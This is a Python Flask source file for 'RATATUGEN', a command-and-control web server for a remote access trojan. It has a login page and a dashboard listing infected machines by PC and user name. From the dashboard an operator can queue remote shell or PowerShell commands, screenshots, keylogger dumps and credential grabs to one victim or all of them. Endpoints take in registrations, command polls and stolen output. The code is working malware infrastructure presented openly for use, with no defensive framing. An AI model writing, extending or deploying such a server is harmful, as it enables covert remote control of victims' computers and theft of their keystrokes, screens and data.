"""
RATATUGEN Web C2 Server
"""
from flask import Flask, request, render_template_string, redirect, session
import time

app = Flask(__name__)
app.secret_key = "ratatugen_c2_secret_2026"
ADMIN_PASSWORD = "ratatugen2026"

clients, commands, results, message_log = {}, {}, {}, []

STYLE = """
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:20px;min-height:100vh}
::selection{background:#e00;color:#fff}
h1{background:linear-gradient(135deg,#e00,#f44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:24px;margin-bottom:5px;letter-spacing:-0.5px}
.topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
.topbar .links a{color:#888;text-decoration:none;font-size:12px;margin-left:15px;padding:5px 10px;border-radius:4px;transition:.2s}
.topbar .links a:hover{background:#1a1a1a;color:#fff}
.broadcast{display:flex;gap:8px;background:#111;padding:12px;border-radius:8px;margin-bottom:15px;border:1px solid #222;flex-wrap:wrap}
.broadcast select{background:#000;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:6px;font-size:13px;min-width:120px;outline:none;cursor:pointer}
.broadcast select:focus{border-color:#c00}
.broadcast input{background:#000;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:6px;flex:1;min-width:200px;font-size:13px;outline:none;font-family:monospace}
.broadcast input:focus{border-color:#c00}
.broadcast button{background:#c00;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:600;font-size:12px;transition:.15s;white-space:nowrap}
.broadcast button:hover{background:#f22;transform:translateY(-1px)}
.agents{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:12px}
.card{background:#111;border:1px solid #222;border-radius:10px;padding:16px;transition:.2s;position:relative;overflow:hidden}
.card:hover{border-color:#333}
.card .status{position:absolute;top:12px;right:14px;font-size:11px;padding:3px 10px;border-radius:20px;font-weight:600;letter-spacing:.5px}
.card .status.online{background:#0a3;color:#fff;box-shadow:0 0 12px rgba(0,170,50,.3)}
.card .status.offline{background:#222;color:#666}
.card h3{font-size:15px;margin-bottom:4px;color:#fff;font-family:monospace}
.card .meta{font-size:11px;color:#666;margin-bottom:10px;display:flex;gap:15px;flex-wrap:wrap}
.card .meta span{display:flex;align-items:center;gap:4px}
.card .actions{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
.card .actions button{background:#1a1a1a;color:#ccc;border:1px solid #333;padding:6px 12px;border-radius:5px;cursor:pointer;font-size:11px;font-weight:500;transition:.15s}
.card .actions button:hover{background:#c00;border-color:#c00;color:#fff}
.card .actions button.kill{background:#1a1a1a;color:#c00;border-color:#333}
.card .actions button.kill:hover{background:#c00;color:#fff}
.card input.cmdline{width:100%;background:#000;border:1px solid #333;color:#fff;padding:7px 10px;border-radius:5px;font-size:12px;font-family:monospace;margin-bottom:6px;outline:none}
.card input.cmdline:focus{border-color:#c00}
.card pre{background:#000;border:1px solid #1a1a1a;border-radius:6px;padding:10px;margin-top:8px;max-height:180px;overflow-y:auto;font-size:11px;color:#aaa;line-height:1.5;white-space:pre-wrap;word-break:break-all}
.card pre b{color:#c00}
.activity{background:#111;border:1px solid #222;border-radius:10px;padding:15px;margin-top:20px}
.activity h2{font-size:16px;color:#c00;margin-bottom:10px}
.activity .entry{font-size:11px;padding:4px 0;border-bottom:1px solid #111;display:flex;gap:10px}
.activity .entry span{color:#555;min-width:130px}
.activity .entry b{color:#c00;min-width:100px;font-family:monospace}
.empty{text-align:center;padding:60px 20px;color:#444;font-size:14px}
"""

LOGIN = '<!DOCTYPE html><html><head><title>RATATUGEN C2</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>' + STYLE + \
    '</style></head><body style="display:flex;justify-content:center;align-items:center;height:100vh">' \
    '<div style="text-align:center"><h1 style="font-size:32px">RATATUGEN C2</h1>' \
    '<form method="POST" style="margin-top:25px">' \
    '<input type="password" name="password" placeholder="Password" style="background:#111;border:1px solid #333;color:#fff;padding:10px 20px;border-radius:6px;width:250px;font-size:14px;text-align:center;outline:none"><br><br>' \
    '<button type="submit" style="background:#c00;color:#fff;border:none;padding:10px 30px;border-radius:6px;cursor:pointer;font-weight:700;font-size:14px;width:250px">Login</button>' \
    '</form></div></body></html>'

DASH = '''<!DOCTYPE html><html><head><title>RATATUGEN C2</title>
<meta name="viewport" content="width=device-width,initial-scale=1"><style>''' + STYLE + '''</style>
<script>
function g(u){window.location=u}
function c(i,d){g('/cmd?client='+i+'&cmd='+encodeURIComponent(d))}
function s(i){g('/cmd?client='+i+'&cmd='+encodeURIComponent(document.getElementById('sh_'+i).value))}
setTimeout(function(){location.reload()},15000)
</script></head><body>
<div class="topbar">
<h1>RATATUGEN C2</h1>
<div class="links"><span style="color:#666;font-size:12px">{{clients|length}} agent{{'s' if clients|length!=1}}</span><a href="/logout">Logout</a></div>
</div>

<div class="broadcast">
<form action="/cmd" method="GET" style="display:flex;gap:8px;flex:1;flex-wrap:wrap">
<select name="client"><option value="*">ALL AGENTS</option>{% for c in clients %}<option value="{{c}}">{{c}}</option>{% endfor %}</select>
<input name="cmd" placeholder="Command (cmd / powershell)">
<button>Run</button>
</form>
</div>

<div class="broadcast" style="padding:8px 12px;gap:6px">
<form action="/cmd" method="GET" style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
<select name="client"><option value="*">ALL</option>{% for c in clients %}<option value="{{c}}">{{c}}</option>{% endfor %}</select>
<button name="cmd" value="GRAB_ALL">Grab All</button>
<button name="cmd" value="SCREENSHOT">Screenshot</button>
<button name="cmd" value="KEYLOG_DUMP">Keylog Dump</button>
<button name="cmd" value="UNINSTALL" style="background:#333;color:#f66">Uninstall</button>
</form>
</div>

{% if not clients %}
<div class="empty">No agents connected. Deploy the RAT on a target machine to see it here.</div>
{% endif %}

<div class="agents">
{% for cid, info in clients.items() %}
<div class="card">
<div class="status {{'online' if info.get('online') else 'offline'}}">{{'ONLINE' if info.get('online') else 'OFFLINE'}}</div>
<h3>{{cid}}</h3>
<div class="meta"><span>PC: {{info.get("pc","?")}}</span><span>User: {{info.get("user","?")}}</span><span>Last: {{info.get("last","-")}}</span></div>
<input class="cmdline" id="sh_{{cid}}" placeholder="cmd / powershell" onkeydown="if(event.key==='Enter')s('{{cid}}')">
<div class="actions">
<button onclick="s('{{cid}}')">Shell</button>
<button onclick="c('{{cid}}','GRAB_ALL')">Grab</button>
<button onclick="c('{{cid}}','SCREENSHOT')">SS</button>
<button onclick="c('{{cid}}','KEYLOG_DUMP')">Keys</button>
<button class="kill" onclick="c('{{cid}}','UNINSTALL')">Kill</button>
</div>
{% if cid in results and results[cid] %}
{% for t, cmd, out in results[cid][-3:]|reverse %}
<pre><b>{{t}}</b> > {{cmd}}
{{out}}</pre>
{% endfor %}
{% endif %}
</div>
{% endfor %}
</div>

<div class="activity"><h2>Activity Log</h2>
{% for t, cid, text in message_log[-40:]|reverse %}
<div class="entry"><span>{{t}}</span><b>{{cid}}</b>{{text}}</div>
{% endfor %}
</div>
</body></html>'''

@app.route('/', methods=['GET','POST'])
def login():
    if request.method=='POST':
        if request.form.get('password')==ADMIN_PASSWORD:
            session['authed']=True;return redirect('/')
        return LOGIN.replace('Password','Wrong Password')
    if not session.get('authed'):return LOGIN
    return dashboard()

@app.route('/logout')
def logout():
    session.pop('authed',None);return redirect('/')

def dashboard():
    now=time.time()
    for c in list(clients.keys()):
        clients[c]['online']=(now-clients[c].get('_last',0))<45
        clients[c]['last']=time.ctime(clients[c].get('_last',0))
    return render_template_string(DASH,clients=clients,results=results,message_log=message_log)

@app.route('/cmd')
def cmd():
    if not session.get('authed'):return redirect('/')
    cid=request.args.get('client','');command=request.args.get('cmd','')
    if cid and command:
        commands[cid]=command
        message_log.append((time.ctime(),cid,'Queued: '+command))
    return redirect('/')

@app.route('/register',methods=['POST'])
def register():
    d=request.get_json(silent=True)or{}
    cid=d.get('id','?')
    clients[cid]={'pc':d.get('pc','?'),'user':d.get('user','?'),'_last':time.time(),'last':time.ctime(),'online':True}
    if not any(t for t in message_log[-5:] if 'Online' in t[2] and cid in t[1]):
        message_log.append((time.ctime(),cid,'Online'))
    return {'status':'ok'}

@app.route('/poll',methods=['POST'])
def poll():
    d=request.get_json(silent=True)or{}
    cid=d.get('id','?')
    if cid not in clients:clients[cid]={'pc':cid,'user':'?','_last':time.time(),'online':True}
    clients[cid]['_last']=time.time();clients[cid]['online']=True
    cmd=commands.pop(cid,None)or commands.pop("*",None)
    return {'command':cmd or''}

@app.route('/result',methods=['POST'])
def result():
    d=request.get_json(silent=True)or{}
    cid=d.get('id','?');cmd=d.get('command','');out=d.get('output','')
    if cid not in results:results[cid]=[]
    results[cid].append((time.ctime(),cmd,out))
    if len(results[cid])>20:results[cid]=results[cid][-20:]
    message_log.append((time.ctime(),cid,'Result: '+cmd))
    return {'status':'ok'}

if __name__=='__main__':
    app.run(host='0.0.0.0',port=5000)